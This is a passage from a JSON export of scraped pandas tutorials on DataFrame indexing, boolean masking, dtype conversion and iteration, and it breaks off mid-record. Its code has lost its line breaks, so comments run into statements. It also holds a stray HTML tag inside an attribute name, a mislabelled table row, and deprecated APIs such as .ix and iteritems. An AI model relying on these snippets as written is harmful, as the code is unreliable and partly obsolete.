    "text": "Indexing in Pandas :Indexing in pandas means simply selecting particular rows and columns of data from a DataFrame. Indexing could mean selecting all the rows and some of the columns, some of the rows and all of the columns, or some of each of the rows and columns. Indexing can also be known as Subset Selection.Let\u2019s see some example of indexing in Pandas. In this article, we are using \u201cnba.csv\u201d file to download the CSV, click here.Selecting some rows and some columnsLet\u2019s take a DataFrame with some fake data, now we perform indexing on this DataFrame. In this, we are selecting some rows and some columns from a DataFrame. Dataframe with dataset.Suppose we want to select columns Age, College and Salary for only rows with a labels Amir Johnson and Terry RozierOur final DataFrame would look like this:Selecting some rows and all columnsLet\u2019s say we want to select row Amir Jhonson, Terry Rozier and John Holland with all columns in a dataframe.Our final DataFrame would look like this:Selecting some columns and all rowsLet\u2019s say we want to select columns Age, Height and Salary with all rows in a dataframe.Our final DataFrame would look like this:\u00a0Pandas Indexing using [ ], .loc[], .iloc[ ], .ix[ ]There are a lot of ways to pull the elements, rows, and columns from a DataFrame. There are some indexing method in Pandas which help in getting an element from a DataFrame. These indexing methods appear very similar but behave very differently. Pandas support four types of Multi-axes indexing they are:Dataframe.[ ] ; This function also known as indexing operatorDataframe.loc[ ] : This function is used for labels.Dataframe.iloc[ ] : This function is used for positions or integer basedDataframe.ix[] : This function is used for both label and integer basedCollectively, they are called the indexers. These are by far the most common ways to index data. These are four function which help in getting the elements, rows, and columns from a DataFrame.\u00a0Indexing a Dataframe using indexing operator [] :Indexing operator is used to refer to the square brackets following an object. The .loc and .iloc indexers also use the indexing operator to make selections. In this indexing operator to refer to df[].Selecting a single columnsIn order to select a single column, we simply put the name of the column in-between the brackets# importing pandas packageimport pandas as pd\u00a0\u00a0# making data frame from csv filedata = pd.read_csv(\"nba.csv\", index_col =\"Name\")\u00a0\u00a0# retrieving columns by indexing operatorfirst = data[\"Age\"]\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(first)Output:Selecting multiple columnsIn order to select multiple columns, we have to pass a list of columns in an indexing operator.# importing pandas packageimport pandas as pd\u00a0\u00a0# making data frame from csv filedata = pd.read_csv(\"nba.csv\", index_col =\"Name\")\u00a0\u00a0# retrieving multiple columns by indexing operatorfirst = data[[\"Age\", \"College\", \"Salary\"]]\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0firstOutput:\u00a0Indexing a DataFrame using .loc[ ] :This function selects data by the label of the rows and columns. The df.loc indexer selects data in a different way than just the indexing operator. It can select subsets of rows or columns. It can also simultaneously select subsets of rows and columns.Selecting a single rowIn order to select a single row using .loc[], we put a single row label in a .loc function.# importing pandas packageimport pandas as pd\u00a0\u00a0# making data frame from csv filedata = pd.read_csv(\"nba.csv\", index_col =\"Name\")\u00a0\u00a0# retrieving row by loc methodfirst = data.loc[\"Avery Bradley\"]second = data.loc[\"R.J. Hunter\"]\u00a0\u00a0\u00a0\u00a0print(first, \"\\n\\n\\n\", second)Output:As shown in the output image, two series were returned since there was only one parameter both of the times.\u00a0Selecting multiple rowsIn order to select multiple rows, we put all the row labels in a list and pass that to .loc function.import pandas as pd\u00a0\u00a0# making data frame from csv filedata = pd.read_csv(\"nba.csv\", index_col =\"Name\")\u00a0\u00a0# retrieving multiple rows by loc methodfirst = data.loc[[\"Avery Bradley\", \"R.J. Hunter\"]]\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(first)Output:\u00a0Selecting two rows and three columnsIn order to select two rows and three columns, we select a two rows which we want to select and three columns and put it in a separate list like this:\r\nDataframe.loc[[\"row1\", \"row2\"], [\"column1\", \"column2\", \"column3\"]]\r\nimport pandas as pd\u00a0\u00a0# making data frame from csv filedata = pd.read_csv(\"nba.csv\", index_col =\"Name\")\u00a0\u00a0# retrieving two rows and three columns by loc methodfirst = data.loc[[\"Avery Bradley\", \"R.J. Hunter\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0[\"Team\", \"Number\", \"Position\"]]\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(first)Output:\u00a0Selecting all of the rows and some columnsIn order to select all of the rows and some columns, we use single colon [:] to select all of rows and list of some columns which we want to select like this:\r\nDataframe.loc[[:, [\"column1\", \"column2\", \"column3\"]]\r\nimport pandas as pd\u00a0\u00a0# making data frame from csv filedata = pd.read_csv(\"nba.csv\", index_col =\"Name\")\u00a0\u00a0# retrieving all rows and some columns by loc methodfirst = data.loc[:, [\"Team\", \"Number\", \"Position\"]]\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(first)Output:\u00a0Indexing a DataFrame using .iloc[ ] :This function allows us to retrieve rows and columns by position. In order to do that, we\u2019ll need to specify the positions of the rows that we want, and the positions of the columns that we want as well. The df.iloc indexer is very similar to df.loc but only uses integer locations to make its selections.Selecting a single rowIn order to select a single row using .iloc[], we can pass a single integer to .iloc[] function.import pandas as pd\u00a0\u00a0# making data frame from csv filedata = pd.read_csv(\"nba.csv\", index_col =\"Name\")\u00a0\u00a0\u00a0\u00a0# retrieving rows by iloc method\u00a0row2 = data.iloc[3]\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(row2)Output:\u00a0Selecting multiple rowsIn order to select multiple rows, we can pass a list of integer to .iloc[] function.import pandas as pd\u00a0\u00a0# making data frame from csv filedata = pd.read_csv(\"nba.csv\", index_col =\"Name\")\u00a0\u00a0\u00a0\u00a0# retrieving multiple rows by iloc method\u00a0row2 = data.iloc [[3, 5, 7]]\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0row2Output:\u00a0Selecting two rows and two columnsIn order to select two rows and two columns, we create a list of 2 integer for rows and list of 2 integer for columns then pass to a .iloc[] function.import pandas as pd\u00a0\u00a0# making data frame from csv filedata = pd.read_csv(\"nba.csv\", index_col =\"Name\")\u00a0\u00a0\u00a0\u00a0# retrieving two rows and two columns by iloc method\u00a0row2 = data.iloc [[3, 4], [1, 2]]\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(row2)Output:\u00a0Selecting all the rows and a some columnsIn order to select all rows and some columns, we use single colon [:] to select all of rows and for columns we make a list of integer then pass to a .iloc[] function.import pandas as pd\u00a0\u00a0# making data frame from csv filedata = pd.read_csv(\"nba.csv\", index_col =\"Name\")\u00a0\u00a0\u00a0\u00a0# retrieving all rows and some columns by iloc method\u00a0row2 = data.iloc [:, [1, 2]]\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(row2)Output:\u00a0Indexing a using Dataframe.ix[ ] :Early in the development of pandas, there existed another indexer, ix. This indexer was capable of selecting both by label and by integer location. While it was versatile, it caused lots of confusion because it\u2019s not explicit. Sometimes integers can also be labels for rows or columns. Thus there were instances where it was ambiguous. Generally, ix is label based and acts just as the .loc indexer. However, .ix also supports integer type selections (as in .iloc) where passed an integer. This only works where the index of the DataFrame is not integer based .ix will accept any of the inputs of .loc and .iloc.Note: The .ix indexer has been deprecated in recent versions of Pandas.Selecting a single row using .ix[] as .loc[]In order to select a single row, we put a single row label in a .ix function. This function act similar as .loc[] if we pass a row label as a argument of a function.# importing pandas packageimport pandas as pd\u00a0\u00a0\u00a0# making data frame from csv filedata = pd.read_csv(\"nba.csv\", index_col =\"Name\")\u00a0\u00a0\u00a0# retrieving row by ix methodfirst = data.ix[\"Avery Bradley\"]\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(first)\u00a0\u00a0Output:Selecting a single row using .ix[] as .iloc[]In order to select a single row, we can pass a single integer to .ix[] function. This function similar as a iloc[] function if we pass an integer in a .ix[] function.# importing pandas packageimport pandas as pd\u00a0\u00a0\u00a0# making data frame from csv filedata = pd.read_csv(\"nba.csv\", index_col =\"Name\")\u00a0\u00a0\u00a0# retrieving row by ix methodfirst = data.ix[1]\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(first)Output:\u00a0Methods for indexing in DataFrameFunctionDescriptionDataframe.head()Return top n rows of a data frame.Dataframe.tail()Return bottom n rows of a data frame.Dataframe.at[]Access a single value for a row/column label pair.Dataframe.iat[]Access a single value for a row/column pair by integer position.Dataframe.tail()Purely integer-location based indexing for selection by position.DataFrame.lookup()Label-based \u201cfancy indexing\u201d function for DataFrame.DataFrame.pop()Return item and drop from frame.DataFrame.xs()Returns a cross-section (row(s) or column(s)) from the DataFrame.DataFrame.get()Get item from object for given key (DataFrame column, Panel slice, etc.).DataFrame.isin()Return boolean DataFrame showing whether each element in the DataFrame is contained in values.DataFrame.where()Return an object of same shape as self and whose corresponding entries are from self where cond is True and otherwise are from other.DataFrame.mask()Return an object of same shape as self and whose corresponding entries are from self where cond is False and otherwise are from other.DataFrame.query()Query the columns of a frame with a boolean expression.DataFrame.insert()Insert column into DataFrame at specified location.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "45716f57c4926b02083e1b4d0be44b53",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "In boolean indexing, we will select subsets of data based on the actual values of the data in the DataFrame and not on their row/column labels or integer locations. In boolean indexing, we use a boolean vector to filter the data.\u00a0\u00a0Boolean indexing is a type of indexing which uses actual values of the data in the DataFrame. In boolean indexing, we can filter a data in four ways \u2013\u00a0\u00a0Accessing a DataFrame with a boolean indexApplying a boolean mask to a dataframeMasking data based on column valueMasking data based on an index valueAccessing a DataFrame with a boolean index :\u00a0In order to access a dataframe with a boolean index, we have to create a dataframe in which the index of dataframe contains a boolean value that is \u201cTrue\u201d or \u201cFalse\u201d. For Example\u00a0\u00a0Python3# importing pandas as pdimport pandas as pd\u00a0\u00a0# dictionary of listsdict = {'name':[\"aparna\", \"pankaj\", \"sudhir\", \"Geeku\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'degree': [\"MBA\", \"BCA\", \"M.Tech\", \"MBA\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'score':[90, 40, 80, 98]}\u00a0\u00a0df = pd.DataFrame(dict, index = [True, False, True, False])\u00a0\u00a0print(df)Output:\u00a0\u00a0Now we have created a dataframe with the boolean index after that user can access a dataframe with the help of the boolean index. User can access a dataframe using three functions that is .loc[], .iloc[], .ix[]\u00a0\u00a0Accessing a Dataframe with a boolean index using .loc[]In order to access a dataframe with a boolean index using .loc[], we simply pass a boolean value (True or False) in a .loc[] function.\u00a0\u00a0Python3# importing pandas as pdimport pandas as pd\u00a0\u00a0# dictionary of listsdict = {'name':[\"aparna\", \"pankaj\", \"sudhir\", \"Geeku\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'degree': [\"MBA\", \"BCA\", \"M.Tech\", \"MBA\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'score':[90, 40, 80, 98]}\u00a0# creating a dataframe with boolean indexdf = pd.DataFrame(dict, index = [True, False, True, False])\u00a0# accessing a dataframe using .loc[] functionprint(df.loc[True])Output:\u00a0\u00a0\u00a0Accessing a Dataframe with a boolean index using .iloc[]In order to access a dataframe using .iloc[], we have to pass a boolean value (True or False) \u00a0but iloc[] function accept only integer as an argument so it will throw an error so we can only access a dataframe when we pass an integer in iloc[] function\u00a0Code #1:\u00a0\u00a0Python3# importing pandas as pdimport pandas as pd\u00a0\u00a0# dictionary of listsdict = {'name':[\"aparna\", \"pankaj\", \"sudhir\", \"Geeku\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'degree': [\"MBA\", \"BCA\", \"M.Tech\", \"MBA\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'score':[90, 40, 80, 98]}\u00a0# creating a dataframe with boolean index\u00a0df = pd.DataFrame(dict, index = [True, False, True, False])\u00a0# accessing a dataframe using .iloc[] functionprint(df.iloc[True])Output:\u00a0\u00a0TypeErrorCode #2:\u00a0\u00a0Python3# importing pandas as pdimport pandas as pd\u00a0\u00a0# dictionary of listsdict = {'name':[\"aparna\", \"pankaj\", \"sudhir\", \"Geeku\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'degree': [\"MBA\", \"BCA\", \"M.Tech\", \"MBA\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'score':[90, 40, 80, 98]}\u00a0# creating a dataframe with boolean index\u00a0df = pd.DataFrame(dict, index = [True, False, True, False])\u00a0\u00a0\u00a0# accessing a dataframe using .iloc[] functionprint(df.iloc[1])Output:\u00a0\u00a0\u00a0Accessing a Dataframe with a boolean index using .ix[]In order to access a dataframe using .ix[], we have to pass boolean value (True or False) and integer value to .ix[] function because as we know that .ix[] function is a hybrid of .loc[] and .iloc[] function.\u00a0Code #1:\u00a0\u00a0Python3# importing pandas as pdimport pandas as pd\u00a0\u00a0# dictionary of listsdict = {'name':[\"aparna\", \"pankaj\", \"sudhir\", \"Geeku\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'degree': [\"MBA\", \"BCA\", \"M.Tech\", \"MBA\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'score':[90, 40, 80, 98]}\u00a0# creating a dataframe with boolean indexdf = pd.DataFrame(dict, index = [True, False, True, False])\u00a0\u00a0\u00a0# accessing a dataframe using .ix[] functionprint(df.ix[True])Output:\u00a0\u00a0Code #2:\u00a0\u00a0Python# importing pandas as pdimport pandas as pd\u00a0\u00a0# dictionary of listsdict = {'name':[\"aparna\", \"pankaj\", \"sudhir\", \"Geeku\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'degree': [\"MBA\", \"BCA\", \"M.Tech\", \"MBA\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'score':[90, 40, 80, 98]}\u00a0# creating a dataframe with boolean indexdf = pd.DataFrame(dict, index = [True, False, True, False])\u00a0\u00a0\u00a0# accessing a dataframe using .ix[] functionprint(df.ix[1])Output:\u00a0\u00a0\u00a0\u00a0Applying a boolean mask to a dataframe :\u00a0In a dataframe we can apply a boolean mask in order to do that we, can use __getitems__ or [] accessor. We can apply a boolean mask by giving a list of True and False of the same length as contain in a dataframe. When we apply a boolean mask it will print only that dataframe in which we pass a boolean value True. To download \u201cnba1.1\u201d CSV file click here.Code #1:\u00a0\u00a0Python3# importing pandas as pdimport pandas as pd\u00a0\u00a0# dictionary of listsdict = {'name':[\"aparna\", \"pankaj\", \"sudhir\", \"Geeku\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'degree': [\"MBA\", \"BCA\", \"M.Tech\", \"MBA\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'score':[90, 40, 80, 98]}\u00a0\u00a0df = pd.DataFrame(dict, index = [0, 1, 2, 3])\u00a0\u00a0\u00a0\u00a0print(df[[True, False, True, False]])Output:\u00a0\u00a0Code #2:\u00a0\u00a0Python3# importing pandas packageimport pandas as pd\u00a0\u00a0# making data frame from csv filedata = pd.read_csv(\"nba1.1.csv\")\u00a0\u00a0df = pd.DataFrame(data, index = [0, 1, 2, 3, 4, 5, 6,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a07, 8, 9, 10, 11, 12])\u00a0\u00a0\u00a0df[[True, False, True, False, True,\u00a0\u00a0\u00a0\u00a0False, True, False, True, False,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0True, False, True]]Output:\u00a0\u00a0\u00a0\u00a0Masking data based on column value :\u00a0In a dataframe we can filter a data based on a column value in order to filter data, we can apply certain conditions on the dataframe using different operators like ==, >, <, <=, >=. When we apply these operators to the dataframe then it produces a Series of True and False. To download the \u201cnba.csv\u201d CSV, click here.Code #1:\u00a0\u00a0Python# importing pandas as pdimport pandas as pd\u00a0\u00a0# dictionary of listsdict = {'name':[\"aparna\", \"pankaj\", \"sudhir\", \"Geeku\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'degree': [\"BCA\", \"BCA\", \"M.Tech\", \"BCA\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'score':[90, 40, 80, 98]}\u00a0# creating a dataframedf = pd.DataFrame(dict)\u00a0\u00a0# using a comparison operator for filtering of dataprint(df['degree'] == 'BCA')Output:\u00a0\u00a0Code #2:\u00a0\u00a0Python# importing pandas packageimport pandas as pd\u00a0\u00a0# making data frame from csv filedata = pd.read_csv(\"nba.csv\", index_col =\"Name\")\u00a0\u00a0# using greater than operator for filtering of dataprint(data['Age'] > 25)Output:\u00a0\u00a0\u00a0\u00a0Masking data based on index value :\u00a0In a dataframe we can filter a data based on a column value in order to filter data, we can create a mask based on the index values using different operators like ==, >, <, etc\u2026 . To download \u201cnba1.1\u201d CSV file click here.Code #1:\u00a0\u00a0Python3# importing pandas as pdimport pandas as pd\u00a0\u00a0# dictionary of listsdict = {'name':[\"aparna\", \"pankaj\", \"sudhir\", \"Geeku\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'degree': [\"BCA\", \"BCA\", \"M.Tech\", \"BCA\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'score':[90, 40, 80, 98]}\u00a0\u00a0\u00a0df = pd.DataFrame(dict, index = [0, 1, 2, 3])\u00a0mask = df.index == 0\u00a0print(df[mask])Output:\u00a0\u00a0Code #2:\u00a0\u00a0Python3# importing pandas packageimport pandas as pd\u00a0\u00a0# making data frame from csv filedata = pd.read_csv(\"nba1.1.csv\")\u00a0# giving a index to a dataframedf = pd.DataFrame(data, index = [0, 1, 2, 3, 4, 5, 6,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a07, 8, 9, 10, 11, 12])\u00a0# filtering data on index valuemask = df.index > 7\u00a0df[mask]Output:\u00a0\u00a0\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "fd0a5e26eb4405a3ebd37efe68eeb15e",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Python is a great language for doing data analysis, primarily because of the fantastic ecosystem of data-centric python packages. Pandas is one of those packages and makes importing and analyzing data much easier. In this article, we are using \u201cnba.csv\u201d file to download the CSV, click here.Cast a pandas object to a specified dtypeDataFrame.astype() function is used to cast a pandas object to a specified dtype. astype() function also provides the capability to convert any suitable existing column to categorical type.Code #1: Convert the Weight column data type.# importing pandas as pdimport pandas as pd\u00a0\u00a0# Making data frame from the csv filedf = pd.read_csv(\"nba.csv\")\u00a0\u00a0# Printing the first 10 rows of\u00a0# the data frame for visualization\u00a0\u00a0df[:10]As the data have some \u201cnan\u201d values so, to avoid any error we will drop all the rows containing any nan values.# drop all those rows which\u00a0# have any 'nan' value in it.df.dropna(inplace = True)# let's find out the data type of Weight columnbefore = type(df.Weight[0])\u00a0\u00a0# Now we will convert it into 'int64' type.df.Weight = df.We<strong>ight.astype('int64')\u00a0\u00a0# let's find out the data type after castingafter = type(df.Weight[0])\u00a0\u00a0# print the value of beforebefore\u00a0\u00a0# print the value of afterafterOutput:# print the data frame and see# what it looks like after the changedf\u00a0Infer better data type for input object columnDataFrame.infer_objects() function attempts to infer better data type for input object column. This function attempts soft conversion of object-dtyped columns, leaving non-object and unconvertible columns unchanged. The inference rules are the same as during normal Series/DataFrame construction.Code #1: Use infer_objects() function to infer better data type.# importing pandas as pdimport pandas as pd\u00a0\u00a0# Creating the dataframe\u00a0df = pd.DataFrame({\"A\":[\"sofia\", 5, 8, 11, 100],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"B\":[2, 8, 77, 4, 11],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"C\":[\"amy\", 11, 4, 6, 9]})\u00a0\u00a0# Print the dataframeprint(df)Output :Let\u2019s see the dtype (data type) of each column in the dataframe.# to print the basic infodf.info()As we can see in the output, first and third column is of object type. whereas the second column is of int64 type. Now slice the dataframe and create a new dataframe from it.# slice from the 1st row till enddf_new = df[1:]\u00a0\u00a0# Let's print the new data framedf_new\u00a0\u00a0# Now let's print the data type of the columnsdf_new.info()Output :As we can see in the output, column \u201cA\u201d and \u201cC\u201d are of object type even though they contain integer value. So, let\u2019s try the infer_objects() function.# applying infer_objects() function.df_new = df_new.infer_objects()\u00a0\u00a0# Print the dtype after applying the functiondf_new.info()Output :Now, if we look at the dtype of each column, we can see that the column \u201cA\u201d and \u201cC\u201d are now of int64 type.\u00a0Detect missing valuesDataFrame.isna() function is used to detect missing values. It return a boolean same-sized object indicating if the values are NA. NA values, such as None or numpy.NaN, gets mapped to True values. Everything else gets mapped to False values. Characters such as empty strings \u201d or numpy.inf are not considered NA values (unless you set pandas.options.mode.use_inf_as_na = True).Code #1: Use isna() function to detect the missing values in a dataframe.# importing pandas as pdimport pandas as pd\u00a0\u00a0# Creating the dataframe\u00a0df = pd.read_csv(\"nba.csv\")\u00a0\u00a0# Print the dataframedfLets use the isna() function to detect the missing values.# detect the missing valuesdf.isna()Output :In the output, cells corresponding to the missing values contains true value else false.\u00a0Detecting existing/non-missing valuesDataFrame.notna() function detects existing/ non-missing values in the dataframe. The function returns a boolean object having the same size as that of the object on which it is applied, indicating whether each individual value is a na value or not. All of the non-missing values gets mapped to true and missing values get mapped to false.Code #1: Use notna() function to find all the non-missing value in the dataframe.# importing pandas as pdimport pandas as pd\u00a0\u00a0# Creating the first dataframe\u00a0df = pd.DataFrame({\"A\":[14, 4, 5, 4, 1],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"B\":[5, 2, 54, 3, 2],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"C\":[20, 20, 7, 3, 8],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"D\":[14, 3, 6, 2, 6]})\u00a0\u00a0# Print the dataframeprint(df)Let\u2019s use the dataframe.notna() function to find all the non-missing values in the dataframe.# find non-na valuesdf.notna()Output :As we can see in the output, all the non-missing values in the dataframe has been mapped to true. There is no false value as there is no missing value in the dataframe.\u00a0Methods for conversion in DataFrameFunctionDescriptionDataFrame.convert_objects()Attempt to infer better dtype for object columns.DataFrame.copy()Return a copy of this object\u2019s indices and data.DataFrame.bool()Return the bool of a single element PandasObject.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "d5171cf75f35e82a8206aeb7e269a618",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Iteration is a general term for taking each item of something, one after another. Pandas DataFrame consists of rows and columns so, in order to iterate over dataframe, we have to iterate a dataframe like a dictionary. In a dictionary, we iterate over the keys of the object in the same way we have to iterate in dataframe.In this article, we are using \u201cnba.csv\u201d file to download the CSV, click here.In Pandas Dataframe we can iterate an element in two ways:\u00a0Iterating over rowsIterating over columns\u00a0Iterating over rows :In order to iterate over rows, we can use three function iteritems(), iterrows(), itertuples() . These three function will help in iteration over rows.\u00a0\u00a0Iteration over rows using iterrows()In order to iterate over rows, we apply a iterrows() function this function returns each index value along with a series containing the data in each row.Code #1:Python3# importing pandas as pdimport pandas as pd\u00a0\u00a0# dictionary of listsdict = {'name':[\"aparna\", \"pankaj\", \"sudhir\", \"Geeku\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'degree': [\"MBA\", \"BCA\", \"M.Tech\", \"MBA\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'score':[90, 40, 80, 98]}\u00a0# creating a dataframe from a dictionarydf = pd.DataFrame(dict)\u00a0print(df)Now we apply iterrows() function in order to get a each element of rows.\u00a0Python3# importing pandas as pdimport pandas as pd\u00a0\u00a0# dictionary of listsdict = {'name':[\"aparna\", \"pankaj\", \"sudhir\", \"Geeku\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'degree': [\"MBA\", \"BCA\", \"M.Tech\", \"MBA\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'score':[90, 40, 80, 98]}\u00a0# creating a dataframe from a dictionarydf = pd.DataFrame(dict)\u00a0# iterating over rows using iterrows() functionfor i, j in df.iterrows():\u00a0\u00a0\u00a0\u00a0print(i, j)\u00a0\u00a0\u00a0\u00a0print()Output:\u00a0Code #2:\u00a0Python# importing pandas moduleimport pandas as pd\u00a0\u00a0\u00a0\u00a0# making data frame from csv filedata = pd.read_csv(\"nba.csv\")\u00a0# for data visualization we filter first 3 datasetsdata.head(3)Now we apply a iterrows to get each element of rows in dataframe\u00a0Python# importing pandas moduleimport pandas as pd\u00a0\u00a0\u00a0\u00a0# making data frame from csv filedata = pd.read_csv(\"nba.csv\")\u00a0for i, j in data.iterrows():\u00a0\u00a0\u00a0\u00a0print(i, j)\u00a0\u00a0\u00a0\u00a0print()Output:\u00a0Iteration over rows using iteritems()In order to iterate over rows, we use iteritems() function this function iterates over each column as key, value pair with the label as key, and column value as a Series object.Code #1:Python3# importing pandas as pdimport pandas as pd\u00a0\u00a0# dictionary of listsdict = {'name':[\"aparna\", \"pankaj\", \"sudhir\", \"Geeku\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'degree': [\"MBA\", \"BCA\", \"M.Tech\", \"MBA\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'score':[90, 40, 80, 98]}\u00a0# creating a dataframe from a dictionarydf = pd.DataFrame(dict)\u00a0print(df)Now we apply a iteritems() function in order to retrieve an rows of dataframe.\u00a0Python3# importing pandas as pdimport pandas as pd\u00a0\u00a0# dictionary of listsdict = {'name':[\"aparna\", \"pankaj\", \"sudhir\", \"Geeku\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'degree': [\"MBA\", \"BCA\", \"M.Tech\", \"MBA\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'score':[90, 40, 80, 98]}\u00a0# creating a dataframe from a dictionarydf = pd.DataFrame(dict)\u00a0# using iteritems() function to retrieve rowsfor key, value in df.iteritems():\u00a0\u00a0\u00a0\u00a0print(key, value)\u00a0\u00a0\u00a0\u00a0print()Output:\u00a0\u00a0Code #2:\u00a0Python# importing pandas moduleimport pandas as pd\u00a0\u00a0\u00a0\u00a0# making data frame from csv filedata = pd.read_csv(\"nba.csv\")\u00a0# for data visualization we filter first 3 datasetsdata.head(3)Output:\u00a0Now we apply a iteritems() in order to retrieve rows from a dataframe\u00a0\u00a0Python# importing pandas moduleimport pandas as pd\u00a0\u00a0\u00a0\u00a0# making data frame from csv filedata = pd.read_csv(\"nba.csv\")\u00a0for key, value in data.iteritems():\u00a0\u00a0\u00a0\u00a0print(key, value)\u00a0\u00a0\u00a0\u00a0print()Output:\u00a0Iteration over rows using itertuples()In order to iterate over rows, we apply a function itertuples() this function return a tuple for each row in the DataFrame. The first element of the tuple will be the row\u2019s corresponding index value, while the remaining values are the row values.Code #1:Python3# importing pandas as pdimport pandas as pd\u00a0\u00a0# dictionary of listsdict = {'name':[\"aparna\", \"pankaj\", \"sudhir\", \"Geeku\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'degree': [\"MBA\", \"BCA\", \"M.Tech\", \"MBA\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'score':[90, 40, 80, 98]}\u00a0# creating a dataframe from a dictionarydf = pd.DataFrame(dict)\u00a0print(df)Now we apply a itertuples() function inorder to get tuple for each rowPython3# importing pandas as pdimport pandas as pd\u00a0\u00a0# dictionary of listsdict = {'name':[\"aparna\", \"pankaj\", \"sudhir\", \"Geeku\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'degree': [\"MBA\", \"BCA\", \"M.Tech\", 